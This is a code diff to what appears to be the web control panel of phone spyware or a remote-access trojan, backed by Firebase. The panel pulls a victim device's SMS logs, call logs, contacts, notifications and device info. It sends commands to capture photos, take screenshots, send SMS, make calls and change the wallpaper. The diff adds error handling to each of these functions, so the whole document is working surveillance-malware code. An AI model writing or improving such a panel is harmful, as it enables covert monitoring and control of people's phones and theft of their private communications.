@@ -41,57 +41,102 @@
         const db = firebase.database();
 
         function fetchDeviceInfo() {
-            db.ref("Device_Info").once("value", snapshot => {
-                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-            });
+            db.ref("Device_Info").once("value")
+                .then(snapshot => {
+                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+                })
+                .catch(error => {
+                    document.getElementById("output").innerText = "Something went wrong";
+                    console.error("Error fetching device info:", error);
+                });
         }
 
         function fetchSMS() {
-            db.ref("SMS_Logs").once("value", snapshot => {
-                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-            });
+            db.ref("SMS_Logs").once("value")
+                .then(snapshot => {
+                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+                })
+                .catch(error => {
+                    document.getElementById("output").innerText = "Something went wrong";
+                    console.error("Error fetching SMS logs:", error);
+                });
         }
 
         function fetchCallLogs() {
-            db.ref("Call_Logs").once("value", snapshot => {
-                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-            });
+            db.ref("Call_Logs").once("value")
+                .then(snapshot => {
+                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+                })
+                .catch(error => {
+                    document.getElementById("output").innerText = "Something went wrong";
+                    console.error("Error fetching call logs:", error);
+                });
         }
 
         function fetchContacts() {
-            db.ref("Contacts").once("value", snapshot => {
-                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-            });
+            db.ref("Contacts").once("value")
+                .then(snapshot => {
+                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+                })
+                .catch(error => {
+                    document.getElementById("output").innerText = "Something went wrong";
+                    console.error("Error fetching contacts:", error);
+                });
         }
 
         function fetchNotifications() {
-            db.ref("Notifications").once("value", snapshot => {
-                document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-            });
+            db.ref("Notifications").once("value")
+                .then(snapshot => {
+                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
+                })
+                .catch(error => {
+                    document.getElementById("output").innerText = "Something went wrong";
+                    console.error("Error fetching notifications:", error);
+                });
         }
 
         function capturePhoto() {
-            db.ref("Commands").set({ action: "capture_photo" });
+            db.ref("Commands").set({ action: "capture_photo" })
+                .catch(error => {
+                    alert("Something went wrong");
+                    console.error("Error capturing photo:", error);
+                });
         }
 
         function takeScreenshot() {
-            db.ref("Commands").set({ action: "take_screenshot" });
+            db.ref("Commands").set({ action: "take_screenshot" })
+                .catch(error => {
+                    alert("Something went wrong");
+                    console.error("Error capturing screenshot:", error);
+                });
         }
 
         function sendSMS() {
             let number = prompt("Enter Phone Number:");
             let message = prompt("Enter Message:");
-            db.ref("Commands").set({ action: "send_sms", number: number, message: message });
+            db.ref("Commands").set({ action: "send_sms", number: number, message: message })
+                .catch(error => {
+                    alert("Something went wrong");
+                    console.error("Error sending SMS:", error);
+                });
         }
 
         function makeCall() {
             let number = prompt("Enter Phone Number:");
-            db.ref("Commands").set({ action: "make_call", number: number });
+            db.ref("Commands").set({ action: "make_call", number: number })
+                .catch(error => {
+                    alert("Something went wrong");
+                    console.error("Error making call:", error);
+                });
         }
 
         function changeWallpaper() {
             let imageUrl = prompt("Enter Image URL:");
-            db.ref("Commands").set({ action: "change_wallpaper", url: imageUrl });
+            db.ref("Commands").set({ action: "change_wallpaper", url: imageUrl })
+                .catch(error => {
+                    alert("Something went wrong");
+                    console.error("Error changing wallpaper:", error);
+                });
         }
     </script>
 </body>
